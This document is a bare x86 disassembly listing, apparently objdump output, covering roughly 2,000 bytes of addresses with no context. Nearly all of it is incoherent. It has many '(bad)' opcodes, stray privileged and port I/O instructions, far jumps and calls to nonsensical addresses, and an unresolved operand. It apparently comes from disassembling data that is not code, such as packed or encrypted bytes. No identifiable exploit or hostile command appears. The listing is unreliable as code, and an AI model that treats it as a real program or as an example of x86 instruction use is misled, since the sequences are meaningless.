  421f48:	stos   BYTE PTR es:[edi],al
  421f49:	aas    
  421f4a:	repnz sbb dl,BYTE PTR [ebx]
  421f4d:	dec    eax
  421f4e:	shr    DWORD PTR [esi],0x27
  421f51:	add    eax,0x84f1eb3d
  421f56:	hlt    
  421f57:	fld    QWORD PTR [edx-0x69f852cb]
  421f5d:	cwde   
  421f5e:	push   eax
  421f5f:	mov    al,0xb0
  421f61:	inc    ebx
  421f62:	popf   
  421f63:	fucom  st(2)
  421f65:	sti    
  421f66:	pop    ecx
  421f67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f68:	or     edx,DWORD PTR [edi+0x2a]
  421f6b:	(bad)  
  421f6c:	imul   ebx,DWORD PTR [ecx-0x58],0xffffffc0
  421f70:	push   es
  421f71:	clc    
  421f72:	sub    bl,BYTE PTR [edx-0x9c627a0]
  421f78:	mov    ecx,0x504402
  421f7d:	sti    
  421f7e:	gs pusha 
  421f80:	pop    edi
  421f81:	xchg   DWORD PTR es:[esi+0x5d],edx
  421f85:	lds    edx,FWORD PTR [ebp+0x75]
  421f88:	jb     0x422002
  421f8a:	fst    QWORD PTR [edi-0x7b]
  421f8d:	jg     0x421faf
  421f8f:	(bad)  
  421f90:	in     eax,dx
  421f91:	dec    eax
  421f92:	sbb    al,ch
  421f94:	rcl    BYTE PTR [edx-0x49],cl
  421f97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f98:	add    eax,edi
  421f9a:	rcr    DWORD PTR [eax-0xa0cc8cb],0x42
  421fa1:	imul   edx,ebx,0x38d1e26e
  421fa7:	sub    cl,BYTE PTR [esp+eax*4+0x70da4046]
  421fae:	mov    edi,0x6aef747a
  421fb3:	sar    DWORD PTR [esi+esi*1-0x6e],cl
  421fb7:	das    
  421fb8:	xor    al,0x23
  421fba:	cmp    ebp,DWORD PTR [ecx-0x747e14b4]
  421fc0:	jno    0x42202c
  421fc2:	clc    
  421fc3:	aas    
  421fc4:	fild   QWORD PTR [eax-0x2a]
  421fc7:	cmc    
  421fc8:	fnsave [edi]
  421fca:	int3   
  421fcb:	ret    
  421fcc:	ss and edi,eax
  421fcf:	fs and al,0xeb
  421fd2:	cmp    al,0xc1
  421fd4:	and    bl,BYTE PTR [edx+0x6ccc6e6f]
  421fda:	add    BYTE PTR [edx-0x67],0xac
  421fde:	mov    edx,0xf337a7b2
  421fe3:	or     BYTE PTR [edx+0x7d],cl
  421fe6:	iret   
  421fe7:	mov    ch,0x68
  421fe9:	call   0x43447145
  421fee:	mov    ds:0xacdb0645,al
  421ff3:	xchg   edi,eax
  421ff4:	fstp   QWORD PTR [ecx]
  421ff6:	enter  0x3ae3,0x3c
  421ffa:	call   FWORD PTR [edi+0x6a15afb4]
  422000:	rcl    DWORD PTR [esi-0xf],0xb0
  422004:	les    ecx,FWORD PTR [ebp-0x16]
  422007:	or     al,BYTE PTR [ebp+0x7a8162d7]
  42200d:	pop    edx
  42200e:	dec    edx
  42200f:	fisub  WORD PTR [eax]
  422011:	shl    BYTE PTR [ebp+0x46],1
  422014:	stos   BYTE PTR es:[edi],al
  422015:	cwde   
  422016:	ja     0x422020
  422018:	mov    al,0x30
  42201a:	push   DWORD PTR [ebx-0x3b]
  42201d:	inc    esi
  42201e:	(bad)  
  42201f:	out    dx,eax
  422020:	mov    ah,0xd7
  422022:	test   al,0x29
  422024:	inc    ebp
  422025:	test   BYTE PTR [edi],bl
  422027:	aam    0xb1
  422029:	loope  0x422014
  42202b:	fnstenv ds:0x9f3b3762
  422031:	cld    
  422032:	nop
  422033:	add    bl,BYTE PTR [esp+ebx*2]
  422036:	(bad)
  422039:	je     0x422023
  42203b:	jno    0x42202e
  42203d:	aam    0x38
  42203f:	mov    ecx,0xc05ab70c
  422044:	push   cs
  422045:	into   
  422046:	xchg   ecx,eax
  422047:	sub    ch,BYTE PTR [edx]
  422049:	aad    0x2d
  42204b:	pop    ebp
  42204c:	xor    esi,DWORD PTR [ecx-0x2a]
  42204f:	leave  
  422050:	pushf  
  422051:	lods   al,BYTE PTR ds:[esi]
  422052:	fdivrp st(5),st
  422054:	lods   al,BYTE PTR ds:[esi]
  422055:	aas    
  422056:	cmc    
  422057:	and    dh,al
  422059:	lods   al,BYTE PTR ds:[esi]
  42205a:	xchg   edi,eax
  42205b:	push   eax
  42205c:	sub    ah,bh
  42205e:	pusha  
  42205f:	mov    esi,0x32caffa5
  422064:	mov    al,0xc7
  422066:	mov    esi,0x196d6653
  42206b:	push   ebp
  42206c:	popf   
  42206d:	push   es
  42206e:	ret    0x6785
  422071:	out    0x4a,eax
  422073:	push   0x17
  422075:	or     DWORD PTR [edi-0x3b],ebx
  422078:	mov    bh,BYTE PTR [esi-0x5d]
  42207b:	iret   
  42207c:	mov    dl,0xe4
  42207e:	push   ebx
  42207f:	pop    ecx
  422080:	jb     0x4220b8
  422082:	aaa    
  422083:	pop    ebp
  422084:	adc    dh,BYTE PTR [ebx]
  422086:	retf   
  422087:	mov    dh,0x45
  422089:	sti    
  42208a:	sub    BYTE PTR [ebp+ecx*2+0x422ef3e6],cl
  422091:	pop    edx
  422092:	push   ss
  422093:	or     al,0xd5
  422095:	cdq    
  422096:	loope  0x42202e
  422098:	(bad)  
  422099:	mov    BYTE PTR [ebx+edi*2+0x53],ah
  42209d:	add    eax,0x568bb857
  4220a2:	jmp    0x99e74d8
  4220a7:	repnz push esp
  4220a9:	out    dx,eax
  4220aa:	xor    eax,DWORD PTR [ecx+0x62]
  4220ad:	ret    
  4220ae:	into   
  4220af:	sbb    esp,esi
  4220b1:	sub    edi,DWORD PTR [ecx]
  4220b3:	enter  0x12ea,0xb6
  4220b7:	pop    esi
  4220b8:	adc    eax,0xc8cc3692
  4220bd:	mov    ah,0xe0
  4220bf:	sub    eax,0x3056d2ed
  4220c4:	out    dx,eax
  4220c5:	rcr    DWORD PTR [esi*2+0x19ec5473],1
  4220cc:	(bad)  
  4220cd:	cmp    DWORD PTR [edi-0x3c],0x7c47b110
  4220d4:	out    0xb0,al
  4220d6:	mov    ebx,0xd19431a7
  4220db:	stos   DWORD PTR es:[edi],eax
  4220dc:	and    esi,0xfca28c8b
  4220e2:	fst    QWORD PTR [edx+0x13b18d6a]
  4220e8:	mov    ah,BYTE PTR [edi]
  4220ea:	and    BYTE PTR [edi+0x43],ah
  4220ed:	cmc    
  4220ee:	psubq  mm6,QWORD PTR [eax-0x4b]
  4220f2:	sub    al,0x84
  4220f4:	push   0xd317702a
  4220f9:	xchg   ebp,eax
  4220fa:	retf   
  4220fb:	repz js 0x4220c9
  4220fe:	add    dh,al
  422100:	mov    bl,0xe
  422102:	xchg   BYTE PTR [edx-0x2c],ah
  422105:	xor    edx,DWORD PTR [esi-0x3962b43b]
  42210b:	cmp    eax,0x3e4d7360
  422110:	outs   dx,DWORD PTR ds:[esi]
  422111:	fisub  DWORD PTR [edi+0x17a6c483]
  422117:	and    ebp,DWORD PTR [esp+edi*1]
  42211a:	cdq    
  42211b:	jecxz  0x4220a6
  42211d:	sub    DWORD PTR [eax],0x688050ab
  422123:	mov    dh,0x6c
  422125:	xor    al,0x7e
  422127:	or     ebp,DWORD PTR [ecx-0x60566df2]
  42212d:	push   ecx
  42212e:	fidivr WORD PTR [eax*2-0x42fb174]
  422135:	rcr    BYTE PTR [esi+0x3a],0x4d
  422139:	cmp    DWORD PTR [edx],ebx
  42213b:	icebp  
  42213c:	xchg   BYTE PTR [edi],ch
  42213e:	mov    dl,0x89
  422140:	sbb    al,0xe0
  422142:	mov    ds:0x320403f9,eax
  422147:	xor    DWORD PTR [edi+0x613c9161],edi
  42214d:	lahf   
  42214e:	dec    eax
  42214f:	or     al,0x9d
  422151:	or     DWORD PTR [ecx],edi
  422153:	ret    
  422154:	call   0x39b81c9b
  422159:	and    DWORD PTR [ecx-0x79],esi
  42215c:	inc    ebx
  42215d:	lock ss inc esi
  422160:	jmp    0x422195
  422162:	retf   
  422163:	sbb    esi,DWORD PTR ds:[eax+0x28d8a19]
  42216a:	cmp    ch,BYTE PTR fs:[ebx]
  42216d:	mov    edi,0x71ce343e
  422172:	in     eax,dx
  422173:	adc    al,0x68
  422175:	add    edi,ebx
  422177:	push   eax
  422178:	mov    ebx,0x54f6bb8a
  42217d:	mov    ah,0xba
  42217f:	push   0xfd36b24f
  422184:	retf   
  422185:	stc    
  422186:	pop    edx
  422187:	retf   
  422188:	mov    ecx,gs
  42218a:	sbb    dh,dh
  42218c:	mov    esp,0x34bcf00a
  422191:	in     al,0x6b
  422193:	mov    ah,cl
  422195:	and    DWORD PTR [ebx],edx
  422197:	fsubr  QWORD PTR ss:[ebx+0x57]
  42219b:	mov    ds:0xf7c6415a,eax
  4221a0:	or     al,0xe4
  4221a2:	mov    ds:0x36ac4727,eax
  4221a7:	inc    eax
  4221a8:	dec    ecx
  4221a9:	mov    ebp,0xc1a39001
  4221ae:	mov    ds:0x6474c7b8,eax
  4221b3:	and    al,0x9f
  4221b5:	mov    ecx,ss
  4221b7:	xchg   dh,ch
  4221b9:	fstp   DWORD PTR [edi-0x2f]
  4221bc:	push   0xffffffc6
  4221be:	cli    
  4221bf:	mov    ebp,0x1146251b
  4221c4:	aad    0xcc
  4221c6:	sub    eax,0x1f86b34e
  4221cb:	cmp    eax,0x6507c13b
  4221d0:	int    0x8b
  4221d2:	(bad)  
  4221d4:	enter  0x9daa,0x96
  4221d8:	leave  
  4221d9:	xchg   edi,eax
  4221da:	dec    esi
  4221db:	icebp  
  4221dc:	pop    edx
  4221dd:	xchg   esi,eax
  4221de:	in     al,0x29
  4221e0:	pop    ds
  4221e1:	loope  0x4221ff
  4221e3:	sbb    bl,BYTE PTR [ecx+edx*4+0x2d20caf9]
  4221ea:	sbb    cl,BYTE PTR ds:0x2ac9ffbe
  4221f0:	and    esi,DWORD PTR [ebx-0x76a675cf]
  4221f6:	inc    edx
  4221f7:	push   esp
  4221f8:	shr    DWORD PTR [edx],1
  4221fa:	outs   dx,DWORD PTR ds:[esi]
  4221fb:	imul   eax,DWORD PTR [eax+edx*2+0x7bb7917d],0x17
  422203:	jmp    0xa90d:0xd7fb2ea3
  42220a:	mov    ebp,0x9e3eee06
  42220f:	test   BYTE PTR [ebp+0x42df019c],0xde
  422216:	mov    ch,BYTE PTR [ecx+esi*2+0x54]
  42221a:	dec    edi
  42221b:	xlat   BYTE PTR ds:[ebx]
  42221c:	outs   dx,BYTE PTR ds:[esi]
  42221d:	psllw  mm1,QWORD PTR [eax+0x6f]
  422221:	jno    0x4221fd
  422223:	sub    DWORD PTR [edi],esp
  422225:	xor    eax,0xf22d07be
  42222a:	mov    ds:0xd64ae6ae,eax
  42222f:	in     al,0x2b
  422231:	pop    ds
  422232:	push   ds
  422233:	mov    al,ds:0x5f833b0d
  422238:	jb     0x4221ba
  42223a:	mov    ah,0xf2
  42223d:	out    0x0,al
  42223f:	std    
  422240:	adc    al,dh
  422242:	test   DWORD PTR [esi+0x31],ebp
  422245:	ss inc edx
  422247:	or     eax,0x48fcf229
  42224c:	bound  esi,QWORD PTR [eax-0x500fc2a5]
  422252:	pop    ebp
  422253:	scas   al,BYTE PTR es:[edi]
  422254:	dec    ecx
  422255:	je     0x422255
  422257:	pop    es
  422258:	into   
  422259:	inc    edx
  42225a:	xor    eax,0x88c4417f
  42225f:	cmp    DWORD PTR [esi+0x9],esi
  422262:	mov    ebx,0x3b87d40d
  422267:	enter  0x2a3d,0xc0
  42226b:	adc    eax,0x31d61f64
  422270:	and    eax,edx
  422272:	jne    0x42220b
  422274:	inc    edi
  422275:	pushf  
  422276:	mov    ds:0xb7769ef1,eax
  42227b:	lock jns 0x422262
  42227e:	inc    esp
  42227f:	ds mov ebp,0xb821716f
  422285:	jne    0x4222d8
  422287:	mov    ecx,0x2b6281d3
  42228c:	mov    al,ds:0xed96e28e
  422291:	lahf   
  422292:	jge    0x42221c
  422294:	sahf   
  422295:	mov    al,0x94
  422297:	outs   dx,BYTE PTR ds:[esi]
  422298:	cmp    BYTE PTR [ebp+0xee79975],ch
  42229e:	push   eax
  42229f:	xchg   esi,eax
  4222a0:	sub    al,0xc
  4222a2:	test   eax,eax
  4222a4:	dec    edx
  4222a5:	ficom  WORD PTR ds:0x3aaa1e65
  4222ab:	push   ecx
  4222ac:	fwait
  4222ad:	loop   0x422250
  4222af:	or     eax,0xaf25c751
  4222b4:	push   ebx
  4222b5:	dec    esi
  4222b6:	jmp    0xd1e8a697
  4222bb:	popa   
  4222bc:	test   DWORD PTR [eax+0x53],esi
  4222bf:	mov    al,ds:0xfdcb2954
  4222c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4222c5:	adc    ah,bh
  4222c7:	gs out 0x1a,eax
  4222ca:	dec    ebx
  4222cb:	adc    al,0xcc
  4222cd:	out    dx,eax
  4222ce:	loop   0x422310
  4222d0:	sahf   
  4222d1:	outs   dx,DWORD PTR ds:[esi]
  4222d2:	add    al,0x10
  4222d5:	and    dh,bl
  4222d7:	in     eax,0xdd
  4222d9:	dec    edx
  4222da:	outs   dx,DWORD PTR ds:[esi]
  4222db:	pushf  
  4222dc:	dec    esi
  4222dd:	test   BYTE PTR [esi],0x8e
  4222e0:	mov    eax,ds:0xb0e9e8ab
  4222e5:	retf   
  4222e6:	xchg   ecx,eax
  4222e7:	pop    DWORD PTR [ecx+ebx*2]
  4222ea:	in     eax,0xa3
  4222ec:	pop    esi
  4222ed:	loop   0x42230a
  4222ef:	int    0x9
  4222f1:	push   es
  4222f2:	rol    ah,0x37
  4222f5:	in     eax,0xc2
  4222f7:	in     eax,0x4c
  4222f9:	push   esi
  4222fa:	ja     0x422370
  4222fc:	mov    ah,0xdf
  4222fe:	mov    ebx,0x97abbaa7
  422303:	inc    edx
  422304:	jbe    0x4222fa
  422306:	popa   
  422307:	xchg   edx,eax
  422308:	shl    BYTE PTR [ecx],cl
  42230a:	retf   
  42230b:	leave  
  42230c:	std    
  42230d:	jne    0x42233a
  42230f:	pushf  
  422310:	nop
  422311:	or     eax,0xb5ddc68
  422316:	frstor ds:0x65d7090
  42231c:	jle    0x422300
  42231e:	cmc    
  42231f:	pusha  
  422320:	sub    BYTE PTR [ecx+ecx*1+0x5359e802],bl
  422327:	jns    0x4222f1
  422329:	inc    ebp
  42232a:	ror    BYTE PTR [ebx+0x33],1
  42232d:	sub    dh,BYTE PTR [edx+0x4e]
  422330:	pop    esi
  422331:	adc    DWORD PTR [ebx+0x49778702],ebp
  422337:	mov    bl,BYTE PTR [ecx-0x7502f667]
  42233d:	mov    bl,0xb
  42233f:	add    edx,ecx
  422341:	imul   edx,edi
  422344:	mov    edi,DWORD PTR [ebp-0x8]
  422347:	mov    ebx,DWORD PTR [ebp-0x10]
  42234a:	sub    ebx,edi
  42234c:	cmp    ebx,edx
  42234e:	ja     0x4227e3
  422354:	jmp    0x4227db
  422359:	ror    edx,1
  42235b:	sar    DWORD PTR [esi],0xd9
  42235e:	vpsubusw xmm1,xmm5,XMMWORD PTR [esi+0x4dee0aae]
  422366:	sbb    al,0xda
  422368:	std    
  422369:	pop    edi
  42236a:	je     0x4223eb
  42236c:	js     0x422354
  42236e:	jl     0x4223e8
  422370:	js     0x42232b
  422372:	add    BYTE PTR [edx*8+0xe1bf9b4],ah
  422379:	xchg   edx,eax
  42237a:	mov    ecx,0x8fdcb7c4
  42237f:	xlat   BYTE PTR ds:[ebx]
  422380:	loop   0x422320
  422382:	out    dx,al
  422383:	imul   ebp,DWORD PTR [ebx-0x5efd855a],0xadf274d
  42238d:	mov    esi,0x36d5e0fc
  422392:	and    bl,ah
  422394:	fldl2e 
  422396:	hlt    
  422397:	clc    
  422398:	pop    ecx
  422399:	mov    DWORD PTR [esi-0x3d2d6b7],eax
  42239f:	xchg   DWORD PTR [edi],eax
  4223a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223a2:	ja     0x422362
  4223a4:	fsubr  DWORD PTR [ebx+ebx*4]
  4223a7:	cdq    
  4223a8:	scas   eax,DWORD PTR es:[edi]
  4223a9:	jle    0x422376
  4223ab:	or     BYTE PTR [eax],0x4d
  4223ae:	into   
  4223af:	xchg   esp,eax
  4223b0:	push   0xc261d6c7
  4223b5:	xchg   ecx,eax
  4223b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223b7:	test   eax,edi
  4223b9:	in     al,0xce
  4223bb:	stc    
  4223bc:	out    0xd7,eax
  4223be:	cdq    
  4223bf:	fiadd  WORD PTR [ebx]
  4223c1:	push   0x3cebb0a
  4223c6:	sub    edx,DWORD PTR [eax+0x57]
  4223c9:	push   es
  4223ca:	scas   eax,DWORD PTR es:[edi]
  4223cb:	sbb    ebx,edi
  4223cd:	mov    ecx,DWORD PTR [esi+ebp*1]
  4223d0:	int    0xfd
  4223d2:	nop
  4223d3:	push   cs
  4223d4:	fld    TBYTE PTR [edx]
  4223d6:	pushf  
  4223d7:	cmp    al,0x56
  4223d9:	lds    ebp,FWORD PTR [edi-0x31]
  4223dc:	jno    0x422443
  4223de:	dec    esp
  4223df:	sbb    eax,0xaf641e0d
  4223e4:	or     esp,edi
  4223e6:	test   DWORD PTR [ebp-0xf9ba7fd],edx
  4223ec:	adc    BYTE PTR [ebp+0x55],ch
  4223ef:	xchg   DWORD PTR ds:0xa344bbbb,esp
  4223f5:	pop    ecx
  4223f6:	push   eax
  4223f7:	sbb    eax,0x35e650eb
  4223fc:	and    ebx,ebx
  4223fe:	mov    eax,0x14701d75
  422403:	or     al,0x29
  422405:	nop
  422406:	inc    esi
  422407:	test   al,ah
  422409:	xor    DWORD PTR [edi],ebx
  42240b:	popf   
  42240c:	call   FWORD PTR [esi-0x7b8fc7c3]
  422412:	xchg   esi,eax
  422413:	(bad)  
  422414:	mov    DWORD PTR [ebp+0x6b1c86b0],ecx
  42241a:	xor    ebx,DWORD PTR [edx-0x43cab18f]
  422420:	and    ebp,ebp
  422422:	adc    eax,0xe0ff9391
  422427:	out    dx,al
  422428:	jnp    0x4223eb
  42242a:	fisttp DWORD PTR [eax+0x16]
  42242d:	cmp    DWORD PTR [ebx+0x58],edx
  422430:	push   DWORD PTR [edi-0x11]
  422433:	sbb    bl,ch
  422435:	jmp    0x4223fb
  422437:	xor    cl,ah
  422439:	xor    edi,esi
  42243b:	mov    eax,0x144b5410
  422440:	pop    es
  422441:	ror    cl,cl
  422443:	adc    al,0xb4
  422445:	clc    
  422446:	or     eax,0xe8d3274e
  42244b:	into   
  42244c:	inc    esi
  42244d:	enter  0x6ce0,0x7f
  422451:	push   ss
  422452:	sbb    BYTE PTR [ecx-0x1f1ece30],dh
  422458:	jecxz  0x42241b
  42245a:	data16 mov dl,0x71
  42245d:	pusha  
  42245e:	das    
  42245f:	xor    al,0xf
  422461:	bound  esp,QWORD PTR [esi+0x68]
  422464:	in     eax,dx
  422465:	stos   BYTE PTR es:[edi],al
  422466:	cdq    
  422467:	stos   DWORD PTR es:[edi],eax
  422468:	mov    ds:0x8e5cdb96,al
  42246d:	add    al,0x2b
  42246f:	test   ah,0xb2
  422472:	mov    ebp,0x4dd5b47c
  422477:	in     eax,0xb7
  422479:	test   DWORD PTR [ecx+0x4c19cfd1],0xd9e33bfe
  422483:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422484:	and    BYTE PTR [ecx-0x5103720c],al
  42248a:	test   al,0x13
  42248c:	test   bh,bh
  42248e:	jo     0x4224d6
  422490:	into   
  422491:	cs call 0x44dd:0xaa293de5
  422499:	call   0xa8fd:0xae13d67d
  4224a0:	daa    
  4224a1:	pop    ebp
  4224a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224a3:	push   esi
  4224a4:	pop    ebp
  4224a5:	frstor [esi-0x66]
  4224a8:	pop    ds
  4224a9:	pop    eax
  4224aa:	mov    BYTE PTR [ebx-0x39],al
  4224ad:	sbb    BYTE PTR [ebp+0x3578568d],al
  4224b3:	mov    esp,0x87dd96de
  4224b8:	xchg   esp,eax
  4224b9:	push   eax
  4224ba:	mov    eax,0x148d4e24
  4224bf:	and    al,0xf4
  4224c1:	jle    0x422528
  4224c3:	out    dx,eax
  4224c4:	aas    
  4224c5:	mov    ah,0xf9
  4224c7:	(bad)
  4224ca:	loope  0x4224b0
  4224cc:	jmp    0xb30ae0bb
  4224d1:	inc    esp
  4224d2:	in     al,0x33
  4224d4:	cmp    bh,BYTE PTR [ebp-0x6489e33]
  4224da:	pop    edi
  4224db:	mov    edi,0xb2c90b1c
  4224e0:	sub    ah,0xa
  4224e3:	mov    ds:0x35554736,al
  4224e8:	ror    BYTE PTR [ebp+0x6],0x18
  4224ec:	cld    
  4224ed:	adc    BYTE PTR [esi-0x6328671d],dl
  4224f3:	idiv   DWORD PTR [ecx+0x7735da53]
  4224f9:	push   edi
  4224fa:	stos   DWORD PTR es:[edi],eax
  4224fb:	ds xchg ebx,eax
  4224fd:	shl    ch,cl
  4224ff:	shr    edi,1
  422501:	xlat   BYTE PTR ds:[ebx]
  422502:	ds mov ah,0xcf
  422505:	rcl    DWORD PTR ds:[ebx+0x6f852d66],0x73
  42250d:	iret   
  42250e:	push   cs
  42250f:	jl     0x42256e
  422511:	pusha  
  422512:	push   ecx
  422513:	mov    ebp,0xe9d23779
  422518:	popa   
  422519:	(bad)  
  42251a:	shl    DWORD PTR [edx],cl
  42251c:	mov    ah,0xe2
  42251e:	sub    ah,bl
  422520:	jmp    0xa41d:0xda31f0b6
  422527:	mov    ds:0xdd48200d,al
  42252c:	into   
  42252d:	das    
  42252e:	dec    ecx
  42252f:	push   ecx
  422530:	mov    BYTE PTR [ebp+0xf297e79],bh
  422536:	loope  0x4224ba
  422538:	inc    ebp
  422539:	xchg   esi,eax
  42253a:	jecxz  0x42251a
  42253c:	cmp    al,ch
  42253e:	mov    esi,0x9f5eea2
  422543:	dec    esi
  422544:	imul   ebp,DWORD PTR [esi+0x157f7ec8],0x31
  42254b:	mov    edi,0x32cdb825
  422550:	mov    ds:0x95c13c43,eax
  422555:	fiadd  WORD PTR [eax+0x3f]
  422558:	or     DWORD PTR [eax-0x8a800fa],0x29
  42255f:	xchg   ebx,eax
  422560:	adc    al,0xd5
  422562:	cmp    DWORD PTR [eax-0x4727ba6e],ebx
  422568:	push   es
  422569:	add    eax,0x3437ebd9
  42256e:	xchg   ebx,eax
  42256f:	test   eax,0x695cb672
  422574:	mov    esp,0xf1d7cc04
  422579:	fld    QWORD PTR [edx+0x3d]
  42257c:	sbb    al,0xc9
  42257e:	loope  0x422552
  422580:	arpl   ax,cx
  422582:	xor    ah,BYTE PTR [edx]
  422584:	stc    
  422585:	add    eax,0x32db21ef
  42258a:	pop    edi
  42258b:	xchg   esi,eax
  42258c:	call   0xc29470de
  422591:	mov    eax,es:0xdd343003
  422597:	push   0x7e
  422599:	inc    ebp
  42259a:	pop    es
  42259b:	add    eax,0x1aef5e1d
  4225a0:	mov    ?,WORD PTR [ecx+0x371c3791]
  4225a6:	imul   ecx,ebx,0x61
  4225a9:	mov    ch,0xbb
  4225ab:	rcl    BYTE PTR [edi-0xf62c402],1
  4225b1:	rcl    ebx,1
  4225b3:	xor    eax,0x398e4790
  4225b8:	add    esp,DWORD PTR [esi-0x4a]
  4225bb:	add    al,BYTE PTR [edi]
  4225bd:	or     ecx,ebx
  4225bf:	out    0xe2,eax
  4225c1:	adc    esi,DWORD PTR [ebp+0x72]
  4225c4:	xor    BYTE PTR [esi-0x5ede13fd],al
  4225ca:	mov    ch,0x78
  4225cc:	sub    eax,0x5902c37d
  4225d1:	sub    eax,0x40940001
  4225d6:	out    dx,al
  4225d7:	push   ebx
  4225d8:	stos   BYTE PTR es:[edi],al
  4225d9:	jae    0x42263c
  4225db:	and    ah,al
  4225dd:	outs   dx,BYTE PTR ds:[esi]
  4225de:	fbld   TBYTE PTR [eax-0x2c]
  4225e1:	scas   eax,DWORD PTR es:[edi]
  4225e2:	popa   
  4225e3:	mov    ebp,0x646bccee
  4225e8:	push   ecx
  4225e9:	xlat   BYTE PTR ds:[ebx]
  4225ea:	repz push edx
  4225ec:	mov    ebx,0x4d4603f0
  4225f1:	fcmovnb st,st(5)
  4225f3:	dec    esp
  4225f4:	pop    edi
  4225f5:	stc    
  4225f6:	enter  0xbe36,0x96
  4225fa:	pop    esp
  4225fb:	or     ebp,DWORD PTR [esi-0x28]
  4225fe:	lds    ebx,FWORD PTR [ebx+ecx*1+0x360f3e9]
  422605:	xchg   DWORD PTR [edi+0x39],esi
  422608:	retw   
  42260a:	sbb    dl,BYTE PTR [edx-0x6b7a1fdf]
  422610:	inc    edx
  422611:	dec    ebx
  422612:	fiadd  WORD PTR [ebp-0x197d676e]
  422618:	rcr    DWORD PTR fs:[eax],1
  42261b:	mov    es,WORD PTR [ecx+0x61]
  42261e:	inc    eax
  42261f:	popa   
  422620:	jecxz  0x422633
  422622:	inc    esi
  422623:	aas    
  422624:	xlat   BYTE PTR ds:[ebx]
  422625:	adc    eax,0xe7df474f
  42262a:	push   cs
  42262b:	inc    sp
  42262d:	sub    bl,BYTE PTR [edi-0x3]
  422630:	fistp  QWORD PTR [eax-0x6c]
  422633:	jl     0x4226af
  422635:	pusha  
  422636:	mov    fs,WORD PTR [edi-0x7f07e015]
  42263c:	ins    BYTE PTR es:[edi],dx
  42263d:	call   0x85311ff1
  422642:	and    ecx,ebx
  422644:	push   cs
  422645:	out    0x81,eax
  422647:	pop    edx
  422648:	test   ecx,esi
  42264a:	add    eax,0x2d2d9782
  42264f:	inc    esp
  422650:	retf   
  422651:	dec    ecx
  422652:	mov    DWORD PTR [esi-0x3bf15fac],eax
  422658:	lahf   
  422659:	retf   
  42265a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42265b:	cmp    DWORD PTR [esi],eax
  42265d:	mov    edx,0xe8aac70d
  422662:	aad    0xf8
  422664:	xchg   esp,eax
  422665:	out    dx,eax
  422666:	adc    al,0xac
  422668:	adc    eax,0xef176290
  42266d:	or     DWORD PTR [ebp+ebp*4+0x2f],0x698cd2d0
  422675:	dec    esi
  422676:	sar    BYTE PTR [esi],cl
  422678:	jmp    0xe9755c83
  42267d:	xchg   BYTE PTR [eax+0x4c],al
  422680:	scas   al,BYTE PTR es:[edi]
  422681:	fisttp DWORD PTR [ebp+0x1]
  422684:	fld    TBYTE PTR [esi+ebx*8-0x3c]
  422688:	das    
  422689:	inc    dh
  42268b:	pop    edi
  42268c:	sbb    al,0xda
  42268e:	fucomi st,st(7)
  422690:	dec    edx
  422691:	and    eax,0x18422d0f
  422696:	cld    
  422697:	fadd   DWORD PTR [ebx-0x58a53ebe]
  42269d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42269e:	div    DWORD PTR [ebx]
  4226a0:	clc    
  4226a1:	inc    edx
  4226a2:	add    BYTE PTR [ebx+0x4c],0xf2
  4226a6:	dec    eax
  4226a7:	lods   al,BYTE PTR ds:[esi]
  4226a8:	pop    eax
  4226a9:	inc    ebx
  4226aa:	outs   dx,DWORD PTR ds:[esi]
  4226ab:	pop    ecx
  4226ac:	jb     0x4226e5
  4226ae:	add    al,0x96
  4226b0:	cli    
  4226b1:	hlt    
  4226b2:	xor    edx,DWORD PTR [edi+0x1a46a2e7]
  4226b8:	js     0x4226a9
  4226ba:	shr    BYTE PTR [ebp-0x6b121117],cl
  4226c0:	jmp    0x42271f
  4226c2:	jno    0x422644
  4226c4:	jmp    0x422687
  4226c6:	pusha  
  4226c7:	je     0x422678
  4226c9:	cmp    DWORD PTR [edi],ecx
  4226cb:	scas   al,BYTE PTR es:[edi]
  4226cc:	push   0x68
  4226ce:	sbb    edx,DWORD PTR [ecx+0x58]
  4226d1:	lea    esp,[edi+0x6175a5e3]
  4226d7:	lds    ebx,FWORD PTR [ecx]
  4226d9:	daa    
  4226da:	cmp    BYTE PTR [si],ch
  4226dd:	sub    BYTE PTR [edx],cl
  4226df:	bound  edx,QWORD PTR [ecx+0x6fcf1c13]
  4226e5:	cmp    BYTE PTR [esi+ebx*8+0x6b],ah
  4226e9:	mov    esp,0xd5aa2e0f
  4226ee:	mov    eax,0x45b6d807
  4226f3:	jnp    0x4226b3
  4226f5:	adc    DWORD PTR [edi+0x68],esi
  4226f8:	add    eax,esp
  4226fa:	cmp    eax,0x6333db0e
  4226ff:	pop    eax
  422700:	dec    edx
  422701:	jl     0x422745
  422703:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422704:	test   bh,bh
  422706:	leave  
  422707:	ins    DWORD PTR es:[edi],dx
  422708:	mov    ds:0xfa99a378,al
  42270d:	cmc    
  42270e:	mov    eax,0xeb50b13c
  422713:	repz push edi
  422715:	int3   
  422716:	pushw  0xc9d1
  42271a:	inc    ebx
  42271b:	xchg   ebp,eax
  42271c:	push   0xa306c031
  422721:	mov    ecx,DWORD PTR [esi-0x3d2e97cc]
  422727:	sahf   
  422728:	in     al,0x63
  42272a:	mov    eax,0xbb24f393
  42272f:	in     eax,0x6
  422731:	jae    0x42274d
  422733:	and    dh,BYTE PTR [edx+0x54fac862]
  422739:	or     DWORD PTR [ecx-0x44],esi
  42273c:	out    dx,al
  42273d:	dec    esp
  42273e:	cld    
  42273f:	popa   
  422740:	stos   DWORD PTR es:[edi],eax
  422741:	fcom   DWORD PTR [edx-0x20f97ac7]
  422747:	imul   ebx,edx,0x20
  42274a:	rol    BYTE PTR [ecx-0x4e],cl
  42274d:	pushf  
  42274e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42274f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422750:	mov    ebp,0xed6e75b
  422755:	dec    ebp
  422756:	(bad)  [edx-0x36]
  422759:	lods   al,BYTE PTR ds:[esi]
  42275a:	sti    
